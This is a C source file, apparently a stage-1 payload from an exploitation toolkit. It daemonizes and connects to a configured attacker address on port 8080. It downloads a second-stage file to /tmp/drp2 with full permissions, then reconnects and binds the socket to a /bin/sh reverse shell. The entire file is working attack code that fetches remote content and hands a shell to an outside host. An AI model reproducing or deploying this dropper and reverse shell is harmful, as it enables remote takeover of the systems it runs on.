/* 
 * Copyright (c) 2013
 * - Zachary Cutlip <uid000@gmail.com>
 * - Tactical Network Solutions, LLC
 * 
 * See LICENSE.txt for more details.
 * 
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define STAGE2_DROP "/tmp/drp2"

int main(void)
{
    char *ex[4];
    int s;
    struct sockaddr_in s4;
    char inbuf[512];
    size_t rb;
    int out_fd;

#ifdef DAEMON
    daemon(0,1);
#endif

    s4.sin_family=AF_INET;

    s4.sin_port=htons(8080);
    s4.sin_addr.s_addr=inet_addr(IPADDRESS);

    s=socket(AF_INET,SOCK_STREAM,0);

    out_fd = open(STAGE2_DROP,O_CREAT|O_WRONLY|O_SYNC,S_IRWXU|S_IRWXG|S_IRWXO);
    if(0 > out_fd)
    {
        printf("failed to create stage 2 drop file.\n");
        exit(1);
    }

    printf("sleeping to ensure drop server is up.\n");
    rb=0;
    while(rb < 10)
    {
        rb++;
        fprintf(stderr,"\r%.*s",rb,"..........");
        usleep(500000);

    }

    printf("\n");

    printf("fetching drop file.\n");

    if(connect(s,(struct sockaddr *)&s4,sizeof(struct sockaddr_in)))
    {
        printf("error connecting to stage 2 drop server. Sorry it didn't work out.\n");
        exit(1);
    }

    rb=0;
    do
    {
        /* yup. first write is 0. suck it. */
        write(out_fd,inbuf,rb);
        rb=read(s,inbuf,512);

    }while(rb>0);

    close(s);
    close(out_fd);

    s=socket(AF_INET,SOCK_STREAM,0);

    printf("connecting to callback server.\n");
    if(connect(s,(struct sockaddr *)&s4,sizeof(struct sockaddr_in)))
    {
        printf("error connecting to callback shell server. Sorry it didn't work out.\n");
        exit(1);
    }


    dup2(s,0);
    dup2(s,1);
    dup2(s,2);
    ex[0]="/bin/sh";
    ex[1]=NULL;
    execve(ex[0],ex,NULL);

    printf("execve() failed.\nInsert 25¢ to play again.");
    exit(1);
}

